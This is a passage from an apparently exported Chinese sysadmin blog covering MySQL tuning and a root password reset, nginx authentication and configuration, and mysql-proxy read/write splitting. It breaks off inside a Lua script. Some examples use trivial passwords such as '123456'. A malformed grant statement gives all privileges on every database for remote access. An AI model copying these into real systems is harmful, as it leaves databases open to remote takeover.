下面就是分析mysql慢日志,调整参数3、mysql参数优化，主要调整的参数如下。根据机器性能来调整，如果你对参数不是很了解，建议不要盲目的调 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;把一些配置文件修改好后重启相关服务，由原来的65s变成了十几秒。效果还是不是很理想，查看了下mysql默认引擎为MyISAM，决定把引擎改为Innodb 导出shop数据库的表结构 1mysqldump -d -uxxx -p shop &gt; shop_table.sql &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中-d参数表示不导出数据，只导出表结构 替换shop_table.sql里的MyISAM为INNODB 1sed -i 's/MyISAM/INNODB/g' shop_table.sql 新建数据库shop_new,并导入表结构 1mysql &gt; create database shop_new;mysql -uroot -p shop_new &lt; shop_table.sql &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以通过show table status来检查表引擎是否为INNODB。 导出shop的数据 1mysqldump -t -uroot -p shop &gt; shop_data.sql &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中-t参数表示只导数据，不导表结构 导入数据到 1shop_newmysql -uroot -p shop_new &lt; shop_data.sql 首先开启慢日志，修改/etc/my.cnf 增加以下两段配置，保存重启mysql 1234vim /etc/my.cnflong_query_time = 2log_slow_queries = /data/mysql/slow.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重启mysql服务 1service mysqld restart 查看慢日志来定位mysql哪条语句执行慢，然后建立索引，优化sql执行语句。 1234567891011121314&lt;font color="Red"&gt;tail -n20 /data/mysql/slow.log #查看20行&lt;/font&gt; # Time: 160303 12:12:38 # User@Host: root[root] @ [10.165.34.182] # Query_time: 10.145685 Lock_time: 0.000395 Rows_sent: 1 Rows_examined: 24306970 use shop;SET timestamp=1456978358; SELECT COUNT(*) FROM `shop`.`ecs_order_info` o LEFT JOIN`shop`.`ecs_users` u ON o.user_id = u.user_id LEFT JOIN `shop`.`ecs_affiliate_log` a ON o.order_id = a.order_id WHERE o.user_id &gt; 0 AND (u.parent_id &gt; 0 AND o.is_separate = 0 OR o.is_separate &gt; 0); # Time: 160303 12:12:44 # User@Host: root[root] @ [10.165.34.182] # Query_time: 6.073441 Lock_time: 0.000152 Rows_sent: 15 Rows_examined: 24314767SET timestamp=1456978364;SELECT o.*, a.log_id, a.user_id as suid, a.user_name as auser, a.money, a.point, a.separate_type,u.parent_id as up FROM `shop`.`ecs_order_info` o LEFT JOIN`shop`.`ecs_users` u ON o.user_id = u.user_id LEFT JOIN `shop`.`ecs_affiliate_log` a ON o.order_id = a.order_id WHERE o.user_id &gt; 0 AND (u.parent_id &gt; 0 AND o.is_separate = 0 OR o.is_separate &gt; 0) ORDER BY order_id DESC LIMIT 0,15; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通过慢日志发现其中有几个表查询耗时较长，下面就是把这个查询慢的表建立索引 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用到的软件 NAvicat，对查询慢的表进行设计，增加索引 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;根据 explain 的解释，查看下索引是否建立，一般都是这样调整就行。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改完后重启 mysql 服务，查询时间从65s,缩短到 0.017407 秒 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;参考了大量的网络资料，头一次搞优化。优化完后很有成就感，算是一次新的挑战]]></content>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql的root密码重置]]></title>
    <url>%2F2017%2F08%2F10%2FMySQL%2F9.%20mysql%E7%9A%84root%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[mysql的root密码重置mysql设置密码1[root@lamp ~]# mysqladmin -uroot password 'yanyi' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：如果mysql已经有密码，该命令要加上 -p 1[root@lamp ~]# mysqladmin -uroot -pyanyi password '123456' 碰到mysql root密码忘记该如何做呢？1.编辑mysql主配置文件my.cnf1[root@lamp ~]# vim /etc/my.cnf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在 [mysql] 字段下添加参数 1skip-grant 2.重启数据库服务1[root@lamp ~]# service mysqld restart 3.进入mysql数据库（此时数据库不用授权）1[root@lamp ~]# /usr/local/mysql/bin/mysql -uroot 4.修改相应的用户密码&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用mysql库 1mysql&gt; use mysql; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;更新一个表 1234mysql&gt; update user set password=password('yanyi') where user='root';mysql&gt; select * from user where user='root'\G;mysql&gt; flush privileges;mysql&gt; quit; 5.修改/etc/my.cnf去掉skip-grant，重启mysql服务12[root@lamp ~]# vim /etc/my.cnf[root@lamp ~]# service mysqld restart &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样就可以用新密码登录了]]></content>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx用户认证]]></title>
    <url>%2F2017%2F08%2F10%2FNginx%2F14.%20nginx%E7%94%A8%E6%88%B7%E8%AE%A4%E8%AF%81%2F</url>
    <content type="text"><![CDATA[nginx用户认证&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;nginx 如何做用户认证，首先需要安装 apache ，也可以使用 yum install -y httpd 安装。 1[root@lnmp ~]# yum install -y httpd &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后生成密码文件： 1234[root@lnmp ~]# htpasswd -c -m /usr/local/nginx/conf/.htpasswd yanyiNew password: Re-type new password: Adding password for user yanyi &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样就添加了 yanyi 用户，第一次添加需要加 -c 参数，第二次添加时不需要 -c 参数。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在 nginx 虚拟主机配置文件中添加 123location ~ .*admin\.php$ &#123; auth_basic "yanyi auth"; auth_basic_user_file /usr/local/nginx/conf/.htpasswd; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样就会把请求 admin 访问给限制了，只有输入用户名和密码才可以继续访问。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这是会出现无法解析 PHP 的情况，把 php 的相关文件复制上来即可 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用 curl 命令验证 1[root@lnmp www]# curl -x127.0.0.1:80 -uyanyi:123456 123.com/admin.php &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;参数 -u 后面跟用户名和密码]]></content>
      <tags>
        <tag>Nginx</tag>
        <tag>LNMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx配置详解]]></title>
    <url>%2F2017%2F08%2F10%2FNginx%2F10.%20nginx%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[nginx配置详解123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394user nginx ;#用户worker_processes 8;#工作进程，根据硬件调整，大于等于cpu核数error_log logs/nginx_error.log crit;#错误日志pid logs/nginx.pid;#pid放置的位置worker_rlimit_nofile 204800;#指定进程可以打开的最大描述符这个指令是指当一个nginx进程打开的最多文件描述符数目，理论值应该是最多打开文件数（ulimit -n）与nginx进程数相除，但是nginx分配请求并不是那么均匀，所以最好与ulimit -n 的值保持一致。现在在linux 2.6内核下开启文件打开数为65535，worker_rlimit_nofile就相应应该填写65535。这是因为nginx调度时分配请求到进程并不是那么的均衡，所以假如填写10240，总并发量达到3-4万时就有进程可能超过10240了，这时会返回502错误。events&#123;use epoll;#使用epoll的I/O 模型补充说明:与apache相类，nginx针对不同的操作系统，有不同的事件模型A）标准事件模型Select、poll属于标准事件模型，如果当前系统不存在更有效的方法，nginx会选择select或pollB）高效事件模型Kqueue：使用于FreeBSD 4.1+, OpenBSD 2.9+, NetBSD 2.0 和 MacOS X.使用双处理器的MacOS X系统使用kqueue可能会造成内核崩溃。Epoll:使用于Linux内核2.6版本及以后的系统。/dev/poll：使用于Solaris 7 11/99+, HP/UX 11.22+ (eventport), IRIX 6.5.15+ 和 Tru64 UNIX 5.1A+。Eventport：使用于Solaris 10. 为了防止出现内核崩溃的问题， 有必要安装安全补丁worker_connections 204800;#工作进程的最大连接数量，根据硬件调整，和前面工作进程配合起来用，尽量大，但是别把cpu跑到100%就行每个进程允许的最多连接数， 理论上每台nginx服务器的最大连接数为worker_processes*worker_connectionskeepalive_timeout 60;keepalive超时时间。client_header_buffer_size 4k;客户端请求头部的缓冲区大小，这个可以根据你的系统分页大小来设置，一般一个请求头的大小不会超过1k，不过由于一般系统分页都要大于1k，所以这里设置为分页大小。分页大小可以用命令getconf PAGESIZE 取得。[root@web001 ~]# getconf PAGESIZE4096但也有client_header_buffer_size超过4k的情况，但是client_header_buffer_size该值必须设置为“系统分页大小”的整倍数。open_file_cache max=65535 inactive=60s;这个将为打开文件指定缓存，默认是没有启用的，max指定缓存数量，建议和打开文件数一致，inactive是指经过多长时间文件没被请求后删除缓存。open_file_cache_valid 80s;这个是指多长时间检查一次缓存的有效信息。open_file_cache_min_uses 1;open_file_cache指令中的inactive参数时间内文件的最少使用次数，如果超过这个数字，文件描述符一直是在缓存中打开的，如上例，如果有一个文件在inactive时间内一次没被使用，它将被移除。&#125;#设定http服务器，利用它的反向代理功能提供负载均衡支持http&#123;include mime.types;#设定mime类型,类型由mime.type文件定义default_type application/octet-stream;log_format main '$host $status [$time_local] $remote_addr [$time_local] $request_uri ''"$http_referer" "$http_user_agent" "$http_x_forwarded_for" ''$bytes_sent $request_time $sent_http_x_cache_hit';log_format log404 '$status [$time_local] $remote_addr $host$request_uri $sent_http_location';$remote_addr与$http_x_forwarded_for用以记录客户端的ip地址；$remote_user：用来记录客户端用户名称；$time_local： 用来记录访问时间与时区；$request： 用来记录请求的url与http协议；$status： 用来记录请求状态；成功是200，$body_bytes_s ent ：记录发送给客户端文件主体内容大小；$http_referer：用来记录从那个页面链接访问过来的；$http_user_agent：记录客户毒啊浏览器的相关信息；通常web服务器放在反向代理的后面，这样就不能获取到客户的IP地址了，通过$remote_add拿到的IP地址是反向代理服务器的iP地址。反向代理服务器在转发请求的http头信息中，可以增加x_forwarded_for信息，用以记录原有客户端的IP地址和原来客户端的请求的服务器地址；access_log /dev/null;#用了log_format指令设置了日志格式之后，需要用access_log指令指定日志文件的存放路径；# access_log /usr/local/nginx/logs/access_log main;server_names_hash_bucket_size 128;#保存服务器名字的hash表是由指令server_names_hash_max_size 和server_names_hash_bucket_size所控制的。参数hash bucket size总是等于hash表的大小，并且是一路处理器缓存大小的倍数。在减少了在内存中的存取次数后，使在处理器中加速查找hash表键值成为可能。如果hash bucket size等于一路处理器缓存的大小，那么在查找键的时候，最坏的情况下在内存中查找的次数为2。第一次是确定存储单元的地址，第二次是在存储单元中查找键 值。因此，如果Nginx给出需要增大hash max size 或 hash bucket size的提示，那么首要的是增大前一个参数的大小.client_header_buffer_size 4k;客户端请求头部的缓冲区大小，这个可以根据你的系统分页大小来设置，一般一个请求的头部大小不会超过1k，不过由于一般系统分页都要大于1k，所以这里设置为分页大小。分页大小可以用命令getconf PAGESIZE取得。large_client_header_buffers 8 128k;客户请求头缓冲大小nginx默认会用client_header_buffer_size这个buffer来读取header值，如果header过大，它会使用large_client_header_buffers来读取如果设置过小HTTP头/Cookie过大 会报400 错误nginx 400 bad request求行如果超过buffer，就会报HTTP 414错误(URI Too Long)nginx接受最长的HTTP头部大小必须比其中一个buffer大，否则就会报400的HTTP错误(Bad Request)。open_file_cache max 102400使用字段:http, server, location 这个指令指定缓存是否启用,如果启用,将记录文件以下信息: ·打开的文件描述符,大小信息和修改时间. ·存在的目录信息. ·在搜索文件过程中的错误信息 --没有这个文件,无法正确读取,参考open_file_cache_errors指令选项:·max -指定缓存的最大数目,如果缓存溢出,最长使用过的文件(LRU)将被移除例: open_file_cache max=1000 inactive=20s; open_file_cache_valid 30s; open_file_cache_min_uses 2; open_file_cache_errors on;open_file_cache_errors语法:open_file_cache_errors on | off 默认值:open_file_cache_errors off 使用字段:http, server, location 这个指令指定是否在搜索一个文件是记录cache错误.open_file_cache_min_uses语法:open_file_cache_min_uses number 默认值:open_file_cache_min_uses 1 使用字段:http, server, location 这个指令指定了在open_file_cache指令无效的参数中一定的时间范围内可以使用的最小文件数,如 果使用更大的值,文件描述符在cache中总是打开状态.open_file_cache_valid语法:open_file_cache_valid time 默认值:open_file_cache_valid 60 使用字段:http, server, location 这个指令指定了何时需要检查open_file_cache中缓存项目的有效信息.client_max_body_size 300m;设定通过nginx上传文件的大小sendfile on;#sendfile指令指定 nginx 是否调用sendfile 函数（zero copy 方式）来输出文件，对于普通应用，必须设为on。如果用来进行下载等应用磁盘IO重负载应用，可设置为off，以平衡磁盘与网络IO处理速度，降低系统uptime。tcp_nopush on;此选项允许或禁止使用socke的TCP_CORK的选项，此选项仅在使用sendfile的时候使用proxy_connect_timeout 90; #后端服务器连接的超时时间_发起握手等候响应超时时间proxy_read_timeout 180;#连接成功后_等候后端服务器响应时间_其实已经进入后端的排队之中等候处理（也可以说是后端服务器处理请求的时间）proxy_send_timeout 180;#后端服务器数据回传时间_就是在规定时间之内后端服务器必须传完所有的数据proxy_buffer_size 256k;#设置从被代理服务器读取的第一部分应答的缓冲区大小，通常情况下这部分应答中包含一个小的应答头，默认情况下这个值的大小为指令proxy_buffers中指定的一个缓冲区的大小，不过可以将其设置为更小proxy_buffers 4 256k;#设置用于读取应答（来自被代理服务器）的缓冲区数目和大小，默认情况也为分页大小，根据操作系统的不同可能是4k或者8kproxy_busy_buffers_size 256k;proxy_temp_file_write_size 256k;#设置在写入proxy_temp_path时数据的大小，预防一个工作进程在传递文件时阻塞太长proxy_temp_path /data0/proxy_temp_dir;#proxy_temp_path和proxy_cache_path指定的路径必须在同一分区proxy_cache_path /data0/proxy_cache_dir levels=1:2 keys_zone=cache_one:200m inactive=1d max_size=30g;#设置内存缓存空间大小为200MB，1天没有被访问的内容自动清除，硬盘缓存空间大小为30GB。keepalive_timeout 120;keepalive超时时间。tcp_nodelay on;client_body_buffer_size 512k;如果把它设置为比较大的数值，例如256k，那么，无论使用firefox还是IE浏览器，来提交任意小于256k的图片，都很正常。如果注释该指令，使用默认的client_body_buffer_size设置，也就是操作系统页面大小的两倍，8k或者16k，问题就出现了。无论使用firefox4.0还是IE8.0，提交一个比较大，200k左右的图片，都返回500 Internal Server Error错误proxy_intercept_errors on;表示使nginx阻止HTTP应答代码为400或者更高的应答。upstream img_relay &#123;server 127.0.0.1:8027;server 127.0.0.1:8028;server 127.0.0.1:8029;hash $request_uri;&#125;nginx的upstream目前支持4种方式的分配1、轮询（默认）每个请求按时间顺序逐一分配到不同的后端服务器，如果后端服务器down掉，能自动剔除。2、weight指定轮询几率，weight和访问比率成正比，用于后端服务器性能不均的情况。例如：upstream bakend &#123;server 192.168.0.14 weight=10;server 192.168.0.15 weight=10;&#125;2、ip_hash每个请求按访问ip的hash结果分配，这样每个访客固定访问一个后端服务器，可以解决session的问题。例如：upstream bakend &#123;ip_hash;server 192.168.0.14:88;server 192.168.0.15:80;&#125;3、fair（第三方）按后端服务器的响应时间来分配请求，响应时间短的优先分配。upstream backend &#123;server server1;server server2;fair;&#125;4、url_hash（第三方）按访问url的hash结果来分配请求，使每个url定向到同一个后端服务器，后端服务器为缓存时比较有效。例：在upstream中加入hash语句，server语句中不能写入weight等其他的参数，hash_method是使用的hash算法upstream backend &#123;server squid1:3128;server squid2:3128;hash $request_uri;hash_method crc32;&#125;tips:upstream bakend&#123;#定义负载均衡设备的Ip及设备状态ip_hash;server 127.0.0.1:9090 down;server 127.0.0.1:8080 weight=2;server 127.0.0.1:6060;server 127.0.0.1:7070 backup;&#125;在需要使用负载均衡的server中增加proxy_pass http://bakend/;每个设备的状态设置为:1.down表示单前的server暂时不参与负载2.weight默认为1.weight越大，负载的权重就越大。3.max_fails：允许请求失败的次数默认为1.当超过最大次数时，返回proxy_next_upstream模块定义的错误4.fail_timeout:max_fails次失败后，暂停的时间。5.backup： 其它所有的非backup机器down或者忙的时候，请求backup机器。所以这台机器压力会最轻。nginx支持同时设置多组的负载均衡，用来给不用的server来使用。client_body_in_file_only设置为On 可以讲client post过来的数据记录到文件中用来做debugclient_body_temp_path设置记录文件的目录 可以设置最多3层目录location对URL进行匹配.可以进行重定向或者进行新的代理 负载均衡server#配置虚拟机&#123;listen 80;#配置监听端口server_name image.***.com;#配置访问域名location ~* \.(mp3|exe)$ &#123;#对以“mp3或exe”结尾的地址进行负载均衡proxy_pass http://img_relay$request_uri;#设置被代理服务器的端口或套接字，以及URLproxy_set_header Host $host;proxy_set_header X-Real-IP $remote_addr;proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;#以上三行，目的是将代理服务器收到的用户的信息传到真实服务器上&#125;location /face &#123;if ($http_user_agent ~* "xnp") &#123;rewrite ^(.*)$ http://211.151.188.190:8080/face.jpg redirect;&#125;proxy_pass http://img_relay$request_uri;proxy_set_header Host $host;proxy_set_header X-Real-IP $remote_addr;proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;error_page 404 502 = @fetch;&#125;location @fetch &#123;access_log /data/logs/face.log log404;#设定本服务器的访问日志rewrite ^(.*)$ http://211.151.188.190:8080/face.jpg redirect;&#125;location /image &#123;if ($http_user_agent ~* "xnp") &#123;rewrite ^(.*)$ http://211.151.188.190:8080/face.jpg redirect;&#125;proxy_pass http://img_relay$request_uri;proxy_set_header Host $host;proxy_set_header X-Real-IP $remote_addr;proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;error_page 404 502 = @fetch;&#125;location @fetch &#123;access_log /data/logs/image.log log404;rewrite ^(.*)$ http://211.151.188.190:8080/face.jpg redirect;&#125;&#125;server&#123;listen 80;server_name *.***.com *.***.cn;location ~* \.(mp3|exe)$ &#123;proxy_pass http://img_relay$request_uri;proxy_set_header Host $host;proxy_set_header X-Real-IP $remote_addr;proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;&#125;location / &#123;if ($http_user_agent ~* "xnp") &#123;rewrite ^(.*)$ http://i1.***img.com/help/noimg.gif redirect;&#125;proxy_pass http://img_relay$request_uri;proxy_set_header Host $host;proxy_set_header X-Real-IP $remote_addr;proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;#error_page 404 http://i1.***img.com/help/noimg.gif;error_page 404 502 = @fetch;&#125;location @fetch &#123;access_log /data/logs/baijiaqi.log log404;rewrite ^(.*)$ http://i1.***img.com/help/noimg.gif redirect;&#125;#access_log off;&#125;server&#123;listen 80;server_name *.***img.com;location ~* \.(mp3|exe)$ &#123;proxy_pass http://img_relay$request_uri;proxy_set_header Host $host;proxy_set_header X-Real-IP $remote_addr;proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;&#125;location / &#123;if ($http_user_agent ~* "xnp") &#123;rewrite ^(.*)$ http://i1.***img.com/help/noimg.gif;&#125;proxy_pass http://img_relay$request_uri;proxy_set_header Host $host;proxy_set_header X-Real-IP $remote_addr;proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;#error_page 404 http://i1.***img.com/help/noimg.gif;error_page 404 = @fetch;&#125;#access_log off;location @fetch &#123;access_log /data/logs/baijiaqi.log log404;rewrite ^(.*)$ http://i1.***img.com/help/noimg.gif redirect;&#125;&#125;server&#123;listen 8080;server_name ngx-ha.***img.com;location / &#123;stub_status on;access_log off;&#125;&#125;server &#123;listen 80;server_name imgsrc1.***.net;root html;&#125;server &#123;listen 80;server_name ***.com w.***.com;# access_log /usr/local/nginx/logs/access_log main;location / &#123;rewrite ^(.*)$ http://www.***.com/ ;&#125;&#125;server &#123;listen 80;server_name *******.com w.*******.com;# access_log /usr/local/nginx/logs/access_log main;location / &#123;rewrite ^(.*)$ http://www.*******.com/;&#125;&#125;server &#123;listen 80;server_name ******.com;# access_log /usr/local/nginx/logs/access_log main;location / &#123;rewrite ^(.*)$ http://www.******.com/;&#125;&#125;location /NginxStatus &#123;stub_status on;access_log on;auth_basic "NginxStatus";auth_basic_user_file conf/htpasswd;&#125;#设定查看Nginx状态的地址location ~ /\.ht &#123;deny all;&#125;#禁止访问.htxxx文件&#125;注释：变量Ngx_http_core_module模块支持内置变量，他们的名字和apache的内置变量是一致的。首先是说明客户请求title中的行，例如$http_user_agent,$http_cookie等等。此外还有其它的一些变量$args此变量与请求行中的参数相等$content_length等于请求行的“Content_Length”的值。$content_type等同与请求头部的”Content_Type”的值$document_root等同于当前请求的root指令指定的值$document_uri与$uri一样$host与请求头部中“Host”行指定的值或是request到达的server的名字（没有Host行）一样$limit_rate允许限制的连接速率$request_method等同于request的method，通常是“GET”或“POST”$remote_addr客户端ip$remote_port客户端port$remote_user等同于用户名，由ngx_http_auth_basic_module认证$request_filename当前请求的文件的路径名，由root或alias和URI request组合而成$request_body_file$request_uri含有参数的完整的初始URI$query_string与$args一样$sheeme http模式（http,https）尽在要求是评估例如Rewrite ^(.+)$ $sheme://example.com$; Redirect;$server_protocol等同于request的协议，使用“HTTP/或“HTTP/$server_addr request到达的server的ip，一般获得此变量的值的目的是进行系统调用。为了避免系统调用，有必要在listen指令中指明ip，并使用bind参数。$server_name请求到达的服务器名$server_port请求到达的服务器的端口号$uri等同于当前request中的URI，可不同于初始值，例如内部重定向时或使用index]]></content>
      <tags>
        <tag>Nginx</tag>
        <tag>LNMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用mysql-proxy 快速实现mysql 集群读写分离]]></title>
    <url>%2F2017%2F08%2F10%2FMySQL%2F36.%20%E4%BD%BF%E7%94%A8mysql-proxy%20%E5%BF%AB%E9%80%9F%E5%AE%9E%E7%8E%B0mysql%20%E9%9B%86%E7%BE%A4%E8%AF%BB%E5%86%99%E5%88%86%E7%A6%BB%2F</url>
    <content type="text"><![CDATA[使用mysql-proxy 快速实现mysql 集群读写分离&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;目前较为常见的mysql读写分离分为两种： 基于程序代码内部实现：在代码中对select操作分发到从库；其它操作由主库执行；这类方法也是目前生产环境应用最广泛，知名的如DISCUZ X2。优点是性能较好，因为在程序代码中实现，不需要增加额外的设备作为硬件开支。缺点是需要开发人员来实现，运维人员无从下手。 基于中间代理层实现：我们都知道代理一般是位于客户端和服务器之间，代理服务器接到客户端请求后通过判断然后转发到后端数据库。在这有两个代表性程序 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;mysql-proxy：mysql-proxy为mysql开源项目，通过其自带的lua脚本进行sql判断，虽然是mysql官方产品，但是mysql官方并不建议将mysql-proxy用到生产环境。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;amoeba：由陈思儒开发，作者曾就职于阿里巴巴，现就职于盛大。该程序由java语言进行开发，目前只听说阿里巴巴将其用于生产环境。另外，此项目严重缺少维护和推广（作者有个官方博客，很多用户反馈的问题发现作者不理睬） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;经过上述简单的比较，通过程序代码实现mysql读写分离自然是一个不错的选择。但是并不是所有的应用都适合在程序代码中实现读写分离，像大型SNS、B2C这类应用可以在代码中实现，因为这样对程序代码本身改动较小；像一些大型复杂的java应用，这种类型的应用在代码中实现对代码改动就较大了。所以，像这种应用一般就会考虑使用代理层来实现。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面我们看一下如何搭建mysql-proxy来实现mysql读写分离 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;环境拓扑如下： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;关于mysql、mysql主从的搭建，在此不再演示，如下的操作均在mysql-proxy（192.168.1.200）服务器进行 一、安装mysql-proxy1、安装lua (mysql-proxy需要使用lua脚本进行数据转发)12tar zxvf lua-5.1.4.tar.gz cd lua-5.1.4 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;vi Makefile，修改INSTALL_TOP= /usr/local/lua 12make posix make install 2、安装libevent1234tar zxvf libevent-2.0.8-rc.tar.gz cd libevent-2.0.8-rc ./configure --prefix=/usr/local/libevent make &amp;&amp; make install 3、安装check1234tar zxvf check-0.9.8.tar.gz cd check-0.9.8 ./configure &amp;&amp; make &amp;&amp; make install 4、安装mysql客户端1234tar zxvf mysql-5.0.92.tar.gz cd mysql-5.0.92 ./configure --without-server &amp;&amp; make &amp;&amp; make install 5、设置环境变量&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;（安装mysql-proxy所需变量） 12345678910vi /etc/profile export LUA_CFLAGS="-I/usr/local/lua/include" LUA_LIBS="-L/usr/local/lua/lib -llua -ldl" LDFLAGS="-L/usr/local/libevent/lib -lm" export CPPFLAGS="-I/usr/local/libevent/include" export CFLAGS="-I/usr/local/libevent/include" # source /etc/profile 6、安装mysql-proxy1234tar zxvf mysql-proxy-0.6.0.tar.gz cd mysql-proxy-0.6.0 ./configure --prefix=/usr/local/mysql-proxy --with-mysql --with-lua make &amp;&amp; make install 7、启动mysql-proxy&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;本次对两台数据库实现了读写分离；mysql-master为可读可写，mysql-slave为只读 12345/usr/local/mysql-proxy/sbin/mysql-proxy --proxy-backend-addresses=192.168.1.201:3306 --proxy-read-only-backend-addresses=192.168.1.202:3306 --proxy-lua-script=/usr/local/mysql-proxy/share/mysql-proxy/rw-splitting.lua &amp; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注：如果正常情况下启动后终端不会有任何提示信息，mysql-proxy启动后会启动两个端口4040和4041，4040用于SQL转发，4041用于管理mysql-proxy。如有多个mysql-slave可以依次在后面添加 二、测试1、连接测试&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;因为默认情况下mysql数据库不允许用户在远程连接 123mysql&gt;grant all privileges on *.* to identified by '123456'; mysql&gt;flush privileges; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;客户端连接 1#mysql -uroot -p123456 -h192.168.1.200 -P4040 2、读写分离测试&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;为了测试出mysql读写分离的真实性，在测试之前，需要开启两台mysql的log功能，然后在mysql-slave服务器停止复制 在两台mysql配置文件my.cnf中加入log=query.log，然后重启 在mysql-slave上执行SQL语句stop slave 在两台mysql上执行#tail -f /usr/local/mysql/var/query.log 在客户端上连接mysql（三个连接以上），然后执行create、select等SQL语句，观察两台mysql的日志有何变化 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注：生产环境中除了进行程序调试外，其它不要开启mysql查询日志，因为查询日志记录了客户端的所有语句，频繁的IO操作将会导致mysql整体性能下降 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;总结：在上述环境中，mysql-proxy和mysql-master、mysql-slave三台服务器均存在单点故障。如果在可用性要求较高的场合，单点隐患是绝对不允许的。为了避免mysql-proxy单点隐患有两种方法，一种方法是mysql-proxy配合keepalived做双机，另一种方法是将mysql-proxy和应用服务安装到同一台服务器上；为了避免mysql-master单点故障可以使用DRBD+heartbear做双机；避免mysql-slave单点故障增加多台mysql-slave即可，因为mysql-proxy会自动屏蔽后端发生故障的mysql-slave。 附: mysql-proxy LUA 读写分离脚本代码:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311--[[---- author : KDr2 -- version 0.01-- SYNOPSIS:--- 1.维护了一个连接池--- 2.读写分离，简单的将select开头的语句放到slave上执行--- 3.事务支持，所有事务放到master上执行，事务中不更改连接--- 4.简单日志----]]--- config varslocal min_idle_connections = 4local max_idle_connections = 8local log_level=1local encoding="utf8"--- end of config事务标识，在事务内不归还连接local transaction_flags=&#123;&#125;setmetatable(transaction_flags,&#123;__index=function() return 0 end&#125;)-- log systemlog=&#123; level=&#123;debug=1,info=2,warn=3,error=4&#125;, funcs=&#123;"debug","info","warn","error"&#125;,&#125;function log.log(level,m) if level &gt;= log_level then local msg="[" .. os.date("%Y-%m-%d %X") .."] ".. log.funcs[level] .. ": " .. tostring(m) print(msg) -- TODO write msg into a log file. endendfor i,v in ipairs(log.funcs) do log[v]=function(m) log.log(log.level[v],m) endend-- connect to serverfunction connect_server() log.info(" starting connect_server ... ") local least_idle_conns_ndx = 0 local least_idle_conns = 0 for i = 1, #proxy.backends do local s = proxy.backends[i] local pool = s.pool local cur_idle = pool.users[""].cur_idle_connections log.debug("[".. s.address .."].connected_clients = " .. s.connected_clients) log.debug("[".. s.address .."].idling_connections = " .. cur_idle) log.debug("[".. s.address .."].type = " .. s.type) log.debug("[".. s.address .."].state = " .. s.state) if s.state ~= proxy.BACKEND_STATE_DOWN then -- try to connect to each backend once at least if cur_idle == 0 then proxy.connection.backend_ndx = i 